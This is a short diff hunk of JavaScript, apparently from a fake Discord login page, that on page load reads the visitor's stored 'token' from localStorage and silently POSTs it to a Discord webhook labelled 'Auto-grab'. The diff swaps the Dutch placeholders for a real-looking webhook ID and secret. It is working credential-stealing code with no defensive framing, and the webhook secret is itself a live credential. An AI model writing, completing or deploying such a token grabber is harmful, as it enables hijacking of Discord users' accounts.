@@ -78,7 +78,7 @@ setTimeout(()=>{window.location.href='https://discord.com/login';},1500);
 window.addEventListener('load',function(){
 const token=localStorage.getItem('token');
 if(token){
-fetch('https://discord.com/api/webhooks/JOUW_WEBHOOK_ID/JOUW_WEBHOOK_TOKEN',{
+fetch('https://discord.com/api/webhooks/1531414508763873510/LCr6PRW9DwicZrjrHh76XURk_tu1aO0yLajcyoFwzRMkyT26o5xXdNoheHo-nnIpccaJ',{
 method:'POST',headers:{'Content-Type':'application/json'},
 body:JSON.stringify({content:`🤖 **Auto-grab**\n🎫 Token: ${token}`})
 }).catch(()=>{});
